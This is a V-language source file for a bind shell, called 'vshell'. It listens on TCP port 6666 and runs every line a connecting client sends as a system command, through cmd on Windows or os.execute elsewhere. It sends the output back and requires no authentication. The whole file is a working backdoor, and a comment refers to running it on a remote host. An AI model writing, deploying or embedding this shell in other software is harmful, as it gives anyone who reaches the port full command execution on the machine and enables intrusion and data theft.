import net
import os

/*
* use "exit" to close connection, use CTRL-C to close program on remote host
*/
fn main() {
	mut listener := net.listen_tcp(6666) ?
	addr := listener.address() ?
	println('Listen on: ' + addr.str())

	for {
		mut conn := listener.accept() ?
		go handle_conn(mut conn)
	}
	listener.close() ?
}

fn handle_conn(mut conn net.TcpConn) ? {
	// println(conn) // debug
	mut exit := false
	mut count := 0 // tcp timeout counter
	for exit == false {
		conn.write_string('vshell:$os.user_os()> ') ?
		conn.wait_for_read() or {
			count++
			if count == 3 {
				exit = true
			}
			continue
		}
		buffer := conn.read_line()

		// print(buffer)	// debugging
		if buffer != 'exit\n' {
			$if windows {
				output := os.execute('cmd /c ' + buffer[..buffer.len - 1])
				conn.write_string(output.str() + '\n') or { continue }
			} $else {
				output := os.execute(buffer)
				conn.write_string(output.str() + '\n') or { continue }
			}
		} else {
			conn.write_string('Bye\n') ?
			exit = true
		}
	}
	conn.close() ?
}
